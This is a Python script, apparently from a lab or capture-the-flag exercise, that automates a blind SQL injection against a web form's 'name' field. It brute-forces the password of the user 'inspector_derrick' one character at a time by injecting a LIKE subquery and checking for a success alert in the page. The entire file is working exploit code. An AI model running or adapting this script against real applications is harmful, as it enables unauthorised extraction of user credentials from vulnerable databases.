import requests
from bs4 import BeautifulSoup
import re

#address = '127.0.01'
address = '0.0.0.0'
section = '/messages'
attack_start = "john' or (SELECT count(name) FROM users WHERE name='inspector_derrick' and password LIKE '"
pwd = ""
attack_end = "%') > 0 --'"


# Create alphabet list of lowercase letters
alphabet = []
for letter in range(97,123):
    alphabet.append(chr(letter))

# create list of numbers
numbers = ["0", "1", "2", "3", "4", "5", "6", "7" ,"8", "9"]

characters = alphabet + numbers

notfound = True

while(notfound):
    nochar = True
    for char in characters:
        test = pwd + char
        attack = attack_start + test + attack_end
		
        dic = {"name": attack}
        r = requests.post("http://" + address + section, dic)
        soup = BeautifulSoup(r.text, "html.parser")
        issuccess = soup.find('div', {'class': "alert alert-success"})
        if issuccess:
            pwd = test
            nochar = False
            break
    if nochar:
        print(pwd)
        notfound = False
		 


